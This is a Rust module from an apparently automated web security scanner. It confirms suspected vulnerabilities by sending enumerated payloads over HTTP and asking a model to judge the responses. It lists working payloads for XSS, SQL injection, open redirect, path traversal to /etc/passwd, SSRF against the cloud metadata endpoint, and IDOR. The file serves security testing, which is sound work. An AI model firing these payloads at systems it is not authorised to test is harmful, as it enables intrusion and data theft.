//! A confirmation agent driven by TypeSafe judgments instead of an LLM.
//!
//! This is not a discovery agent — it does not roam, read source, or invent new
//! attack surface. It is an *additional confirmation strategy*: given a finding
//! (or a lead) of an enumerable class, it runs a tight, code-owned loop where
//! TypeSafe supplies the decisions and the replay engine does the acting:
//!
//! ```text
//!   code enumerates candidate payloads for the class
//!            │
//!     TypeSafe Choice — which candidate is most likely to confirm, given
//!            │           what has been tried and observed so far?
//!     replay engine sends it, records the real exchange
//!            │
//!     TypeSafe Noul   — does THIS response demonstrate the class?
//!            │
//!     loop until confirmed, or the candidates run out
//! ```
//!
//! Why it exists: the LLM agents are strong at breadth and weak at calibrated
//! "did that actually work". A `testphp.vulnweb.com` run that returned zero
//! findings is the failure this addresses — a bounded, cheap, deterministic
//! second opinion that improves recall without inflating precision, because the
//! judgment is calibrated and the acting is real HTTP, not narrative.
//!
//! It is entirely optional and flag-gated (`--typesafe off` skips it), so a run
//! with it and a run without it are the same pipeline minus this pass — which is
//! exactly what makes the two comparable.

use crate::replay::{ReplayEngine, ReqSpec};
use crate::typesafe::{Question, TypeSafe};
use crate::types::Finding;
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;

/// A payload to try, and how it is delivered.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Candidate {
    /// Short id shown to the Choice question.
    pub id: String,
    /// The payload string.
    pub payload: String,
    /// How it changes the request: a query param, a path suffix, a body.
    pub delivery: Delivery,
    /// One-line description for the Choice criteria.
    pub note: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Delivery {
    /// Append `?<param>=<payload>` (or set it if present).
    Query(String),
    /// Append the payload to the path.
    PathSuffix,
    /// Replace a numeric id segment in the path with the payload (IDOR).
    IdSwap,
    /// Send as the request body.
    Body,
}

/// What a class needs: its candidate payloads and the two questions.
struct ClassSpec {
    /// Human name.
    name: &'static str,
    /// The Noul question — does the response demonstrate the class?
    judge: &'static str,
    judge_yes: &'static str,
    judge_no: &'static str,
}

/// The class table. Only enumerable classes — where code can list the
/// candidate payloads — belong here; open-ended discovery does not.
fn class_of(cwe: &str, title: &str) -> Option<(ClassSpec, Vec<Candidate>)> {
    let n: u32 = cwe.chars().filter(|c| c.is_ascii_digit()).collect::<String>().parse().unwrap_or(0);
    let t = title.to_lowercase();
    let q = |name: &str| Delivery::Query(name.to_string());

    let cand = |id: &str, payload: &str, delivery: Delivery, note: &str| Candidate {
        id: id.into(), payload: payload.into(), delivery, note: note.into(),
    };

    if n == 79 || t.contains("xss") || t.contains("cross-site scripting") {
        return Some((
            ClassSpec { name: "reflected-xss", judge: "Given the response body, is the injected marker reflected UNENCODED in a place where it would execute as script (inside a tag, an event handler, or a script block) — not HTML-escaped and not only inside a text node?", judge_yes: "the marker appears unencoded in an executable position", judge_no: "the marker is escaped, encoded, or absent" },
            vec![
                cand("break-attr", "\"><svg onload=NSXSSMARK>", q("q"), "attribute break-out into an event handler"),
                cand("script-tag", "<script>NSXSSMARK</script>", q("q"), "raw script tag"),
                cand("js-ctx", "';NSXSSMARK//", q("q"), "break out of a JS string context"),
                cand("img-onerror", "<img src=x onerror=NSXSSMARK>", q("search"), "img onerror handler"),
            ],
        ));
    }
    if n == 89 || t.contains("sql injection") || t.contains("sqli") {
        return Some((
            ClassSpec { name: "sqli", judge: "Comparing this response to a normal one, does it show a SQL error, or a boolean/row-count difference that indicates the payload altered the query (as opposed to being handled as ordinary input)?", judge_yes: "a SQL error or a query-altering difference is visible", judge_no: "the response is normal or the input was safely handled" },
            vec![
                cand("squote", "'", q("id"), "a single quote to trigger a syntax error"),
                cand("or-true", "' OR '1'='1", q("id"), "always-true boolean"),
                cand("and-false", "' AND '1'='2", q("id"), "always-false boolean (contrast)"),
                cand("union", "' UNION SELECT NULL-- -", q("id"), "union probe"),
            ],
        ));
    }
    if n == 601 || t.contains("open redirect") {
        return Some((
            ClassSpec { name: "open-redirect", judge: "Does the response redirect (Location header or meta refresh) to the attacker host in the payload, rather than staying on the target's own host?", judge_yes: "it redirects off-site to the attacker host", judge_no: "it stays on-site or does not redirect" },
            vec![
                cand("scheme-rel", "//neurosploit.example", q("next"), "scheme-relative external"),
                cand("abs-url", "https://neurosploit.example/", q("url"), "absolute external URL"),
                cand("backslash", "/\\neurosploit.example", q("redirect"), "backslash bypass"),
                cand("at-trick", "https://target@neurosploit.example", q("returnUrl"), "userinfo trick"),
            ],
        ));
    }
    if n == 22 || t.contains("path traversal") || t.contains("lfi") || t.contains("local file inclusion") {
        return Some((
            ClassSpec { name: "path-traversal", judge: "Does the response contain the contents of a system file (e.g. an /etc/passwd style `root:x:0:0` line, or a Windows hosts file), indicating the traversal reached the filesystem?", judge_yes: "system file contents are present", judge_no: "no file contents; a normal or error page" },
            vec![
                cand("etc-passwd", "../../../../etc/passwd", q("file"), "classic unix traversal"),
                cand("encoded", "..%2f..%2f..%2f..%2fetc%2fpasswd", q("file"), "url-encoded traversal"),
                cand("path-suffix", "../../../../etc/passwd", Delivery::PathSuffix, "traversal on the path itself"),
                cand("win-hosts", "..\\..\\..\\..\\windows\\win.ini", q("file"), "windows traversal"),
            ],
        ));
    }
    if n == 918 || t.contains("ssrf") {
        return Some((
            ClassSpec { name: "ssrf", judge: "Does the response show that the server fetched the supplied URL (its body/metadata, a timing difference, or an error naming the internal host), as opposed to rejecting or ignoring it?", judge_yes: "the server fetched or tried to fetch the supplied URL", judge_no: "the URL was rejected, validated, or ignored" },
            vec![
                cand("oast", "http://NSOOBHOST/", q("url"), "an out-of-band URL under our control"),
                cand("metadata", "http://169.254.169.254/latest/meta-data/", q("url"), "cloud metadata endpoint"),
                cand("localhost", "http://127.0.0.1:80/", q("url"), "loopback"),
            ],
        ));
    }
    if n == 639 || t.contains("idor") || t.contains("bola") || t.contains("broken access control") {
        return Some((
            ClassSpec { name: "idor", judge: "Does the response return another user's object/data for the swapped identifier, rather than a 401/403/404 or an empty/own result?", judge_yes: "another user's data is returned for the swapped id", judge_no: "access is denied, empty, or only the caller's own data" },
            vec![
                cand("dec", "1", Delivery::IdSwap, "decrement to a neighbouring id"),
                cand("inc", "2", Delivery::IdSwap, "increment to a neighbouring id"),
                cand("zero", "0", Delivery::IdSwap, "the zero/first id"),
                cand("admin", "1000", Delivery::IdSwap, "a low/admin-range id"),
            ],
        ));
    }
    None
}

/// Apply a candidate to the finding's endpoint, producing a concrete request.
///
/// Pure and testable: the delivery decides how the payload lands, and the OAST
/// placeholder is substituted with the real collaborator host when one exists.
pub fn build_request(endpoint: &str, cand: &Candidate, marker: &str, oob_host: Option<&str>) -> ReqSpec {
    let payload = cand.payload
        .replace("NSXSSMARK", marker)
        .replace("NSOOBHOST", oob_host.unwrap_or("oob.invalid"));
    match &cand.delivery {
        Delivery::Query(param) => {
            let sep = if endpoint.contains('?') { '&' } else { '?' };
            ReqSpec::get(&format!("{endpoint}{sep}{param}={}", urlencode(&payload)))
        }
        Delivery::PathSuffix => {
            let base = endpoint.trim_end_matches('/');
            ReqSpec::get(&format!("{base}/{}", urlencode(&payload)))
        }
        Delivery::IdSwap => ReqSpec::get(&swap_id(endpoint, &payload)),
        Delivery::Body => {
            let mut r = ReqSpec { method: "POST".into(), url: endpoint.to_string(), ..Default::default() };
            r.body = payload;
            r
        }
    }
}

/// Replace the last numeric path segment with `id` (for IDOR).
fn swap_id(url: &str, id: &str) -> String {
    let (base, query) = url.split_once('?').unwrap_or((url, ""));
    let mut segs: Vec<String> = base.split('/').map(|s| s.to_string()).collect();
    if let Some(pos) = segs.iter().rposition(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_digit())) {
        segs[pos] = id.to_string();
    }
    let rebuilt = segs.join("/");
    if query.is_empty() { rebuilt } else { format!("{rebuilt}?{query}") }
}

fn urlencode(s: &str) -> String {
    s.bytes().map(|b| match b {
        b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => (b as char).to_string(),
        _ => format!("%{b:02X}"),
    }).collect()
}

/// The outcome of the confirmation loop.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Confirmation {
    pub class: String,
    /// Did the loop confirm the class?
    pub confirmed: bool,
    /// Calibrated probability from the deciding Noul (0..1).
    pub probability: f64,
    /// The payload that produced the strongest result.
    pub payload: String,
    /// How many candidates were tried.
    pub rounds: usize,
    pub detail: String,
}

/// The agent.
pub struct TypeSafeAgent {
    ts: TypeSafe,
    engine: ReplayEngine,
    /// Confirm when the judging Noul clears this.
    threshold: f64,
    /// OAST host for SSRF candidates, when a collaborator is running.
    oob_host: Option<String>,
}

impl TypeSafeAgent {
    pub fn new(ts: TypeSafe, engine: ReplayEngine) -> Self {
        TypeSafeAgent { ts, engine, threshold: 0.7, oob_host: None }
    }
    pub fn with_oob(mut self, host: Option<String>) -> Self {
        self.oob_host = host;
        self
    }

    /// Run the confirmation loop for one finding. Returns None for a class this
    /// agent does not enumerate — the LLM path owns those.
    pub async fn confirm(&self, f: &Finding) -> Option<Confirmation> {
        let (spec, candidates) = class_of(&f.cwe, &f.title)?;
        if f.endpoint.trim().is_empty() {
            return None;
        }
        let marker = crate::validation::canary("nsxss");
        let mut tried: Vec<(String, u16, f64)> = Vec::new(); // (id, status, judge_p)
        let mut best: Option<Confirmation> = None;

        for round in 0..candidates.len() {
            // Ask TypeSafe which untried candidate is most promising, given the
            // endpoint and what has happened so far.
            let untried: Vec<&Candidate> = candidates.iter().filter(|c| !tried.iter().any(|(id, _, _)| id == &c.id)).collect();
            if untried.is_empty() {
                break;
            }
            let pick = self.choose(&spec, &f.endpoint, &untried, &tried).await.unwrap_or_else(|| untried[0].id.clone());
            let Some(cand) = candidates.iter().find(|c| c.id == pick) else { continue };

            let req = build_request(&f.endpoint, cand, &marker, self.oob_host.as_deref());
            let ex = match self.engine.send(&req).await {
                Ok(x) => x,
                Err(_) => { tried.push((cand.id.clone(), 0, 0.0)); continue; }
            };
            // WAF/edge answers don't count as the application.
            if !crate::waf::classify_exchange(&ex).origin.supports_a_finding() {
                tried.push((cand.id.clone(), ex.status, 0.0));
                continue;
            }
            let p = self.judge(&spec, &ex, &marker).await.unwrap_or(0.0);
            tried.push((cand.id.clone(), ex.status, p));

            let is_best = best.as_ref().map(|b| p > b.probability).unwrap_or(true);
            if is_best {
                best = Some(Confirmation {
                    class: spec.name.into(),
                    confirmed: p >= self.threshold,
                    probability: p,
                    payload: cand.payload.replace("NSXSSMARK", &marker),
                    rounds: round + 1,
                    detail: format!("{} confirmed at p={:.2} with candidate '{}'", spec.name, p, cand.id),
                });
            }
            if p >= self.threshold {
                break; // confirmed — stop early
            }
        }

        best.map(|mut c| {
            c.rounds = tried.len();
            if !c.confirmed {
                c.detail = format!("{} not confirmed — best p={:.2} over {} candidate(s)", spec.name, c.probability, tried.len());
            }
            c
        })
    }

    async fn choose(&self, spec: &ClassSpec, endpoint: &str, untried: &[&Candidate], tried: &[(String, u16, f64)]) -> Option<String> {
        let options: Vec<(&str, &str)> = untried.iter().map(|c| (c.id.as_str(), c.note.as_str())).collect();
        let mut qs = BTreeMap::new();
        qs.insert("pick".to_string(), Question::choice(
            &format!("For a suspected {} on this endpoint, which candidate payload is most likely to CONFIRM it next, given what has already been tried?", spec.name),
            &options,
        ));
        let state = serde_json::json!({
            "endpoint": endpoint,
            "already_tried": tried.iter().map(|(id, st, p)| format!("{id}: HTTP {st}, judge p={p:.2}")).collect::<Vec<_>>(),
        });
        let answers = self.ts.evaluate(state, qs).await.ok()?;
        answers.get("pick").and_then(|a| a.choice.clone())
    }

    async fn judge(&self, spec: &ClassSpec, ex: &crate::validation::Exchange, marker: &str) -> Option<f64> {
        let mut qs = BTreeMap::new();
        qs.insert("holds".to_string(), Question::noul(spec.judge, spec.judge_yes, spec.judge_no));
        let state = serde_json::json!({
            "marker": marker,
            "status": ex.status,
            "content_type": ex.content_type,
            "location": ex.header("location"),
            "body_snippet": ex.body.chars().take(2000).collect::<String>(),
        });
        let answers = self.ts.evaluate(state, qs).await.ok()?;
        answers.get("holds").and_then(|a| a.noul)
    }
}

/// Which classes this agent can attempt — used to decide whether to invoke it.
pub fn handles(cwe: &str, title: &str) -> bool {
    class_of(cwe, title).is_some()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn f(cwe: &str, endpoint: &str) -> Finding {
        Finding { cwe: cwe.into(), endpoint: endpoint.into(), ..Default::default() }
    }

    #[test]
    fn only_enumerable_classes_are_handled() {
        assert!(handles("CWE-79", "Reflected XSS"));
        assert!(handles("CWE-89", "SQLi"));
        assert!(handles("CWE-601", "Open redirect"));
        assert!(handles("CWE-22", "Path traversal"));
        assert!(handles("CWE-918", "SSRF"));
        assert!(handles("CWE-639", "IDOR"));
        // Discovery-only / non-enumerable classes are left to the LLM path.
        assert!(!handles("CWE-1021", "Clickjacking"));
        assert!(!handles("CWE-319", "Cleartext"));
    }

    #[test]
    fn class_falls_back_to_title_when_cwe_is_missing() {
        assert!(handles("", "Reflected Cross-Site Scripting"));
        assert!(handles("x", "Blind SQL injection"));
    }

    #[test]
    fn query_delivery_appends_the_encoded_payload() {
        let (_, cands) = class_of("CWE-79", "xss").unwrap();
        let c = cands.iter().find(|c| c.id == "script-tag").unwrap();
        let req = build_request("https://t.test/s", c, "MARK123", None);
        assert!(req.url.contains("q="));
        assert!(req.url.contains("MARK123"), "the marker is substituted: {}", req.url);
        assert!(req.url.contains("%3Cscript%3E"), "the payload is url-encoded: {}", req.url);
    }

    #[test]
    fn query_delivery_respects_an_existing_query_string() {
        let (_, cands) = class_of("CWE-89", "sqli").unwrap();
        let c = &cands[0];
        let req = build_request("https://t.test/p?id=5", c, "M", None);
        assert!(req.url.contains("?id=5&id="), "a second param is joined with &: {}", req.url);
    }

    #[test]
    fn idor_swaps_the_last_numeric_segment() {
        assert_eq!(swap_id("https://t.test/api/users/42", "1000"), "https://t.test/api/users/1000");
        assert_eq!(swap_id("https://t.test/api/users/42?full=1", "0"), "https://t.test/api/users/0?full=1");
        // No numeric segment → unchanged.
        assert_eq!(swap_id("https://t.test/api/me", "1"), "https://t.test/api/me");
    }

    #[test]
    fn ssrf_oob_host_is_substituted_when_present() {
        let (_, cands) = class_of("CWE-918", "ssrf").unwrap();
        let oast = cands.iter().find(|c| c.id == "oast").unwrap();
        let with = build_request("https://t.test/fetch", oast, "M", Some("abc.oob.example.com"));
        assert!(with.url.contains("abc.oob.example.com"), "{}", with.url);
        let without = build_request("https://t.test/fetch", oast, "M", None);
        assert!(without.url.contains("oob.invalid"));
    }

    #[test]
    fn path_suffix_delivery_extends_the_path() {
        let (_, cands) = class_of("CWE-22", "path traversal").unwrap();
        let c = cands.iter().find(|c| matches!(c.delivery, Delivery::PathSuffix)).unwrap();
        let req = build_request("https://t.test/download/", c, "M", None);
        assert!(req.url.starts_with("https://t.test/download/"));
        assert!(req.url.contains("etc") && req.url.contains("passwd"));
    }
}
